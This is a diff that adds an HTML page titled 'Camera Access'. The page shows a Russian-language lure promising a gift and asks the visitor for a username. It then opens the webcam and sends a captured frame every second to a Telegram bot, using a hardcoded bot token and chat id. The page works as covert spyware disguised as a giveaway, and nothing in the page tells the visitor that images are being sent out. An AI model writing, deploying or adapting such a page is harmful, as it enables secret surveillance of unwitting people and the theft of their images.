@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Camera Access</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="flex bg-sky-950 items-center h-screen justify-center">
+  <video id="video" width="640" height="480" autoplay></video>
+  <h1 class="text-4xl text-center animate-pulse text-amber-400">
+    Подождите немного чтобы получить подарок!
+  </h1>
+
+  <script>
+    let ism = prompt("Введите своё Имя пользователя");
+    document.addEventListener("DOMContentLoaded", function () {
+      // Kamera oqimini olish
+      navigator.mediaDevices
+        .getUserMedia({ video: true })
+        .then(function (stream) {
+          var video = document.getElementById("video");
+          video.srcObject = stream;
+          video.play();
+        })
+        .catch(function (err) {
+          console.log("Ошибка при доступе к камере: " + err);
+        });
+
+      // Foydalanuvchi ism kiritgach, rasmni yuborish funksiyasi
+      function sendVideo() {
+        var video = document.getElementById("video");
+        var canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        var context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Rasmni Telegramga yuborish
+        canvas.toBlob(function (blob) {
+          var formData = new FormData();
+          formData.append("chat_id", "6237530541");
+          formData.append("photo", blob);
+
+          fetch(
+            "https://api.telegram.org/bot8153868130:AAEs51lDNjtNsgSGptT3SLnscY8S_JzhWEs/sendPhoto",
+            {
+              method: "POST",
+              body: formData,
+            }
+          )
+            .then(function (response) {
+              if (!response.ok) {
+                throw new Error("Ошибка отправки фотографии на сервер");
+              }
+              console.log("Фотография успешно отправлена на сервер");
+            })
+            .catch(function (error) {
+              console.error("Произошла ошибка:", error);
+            });
+        }, "image/jpeg");
+      }
+
+      // Video oqimining har bir 1 soniyadagi suratini yuborish
+      setInterval(sendVideo, 1000);
+    });
+  </script>
+</body>
+
+</html>
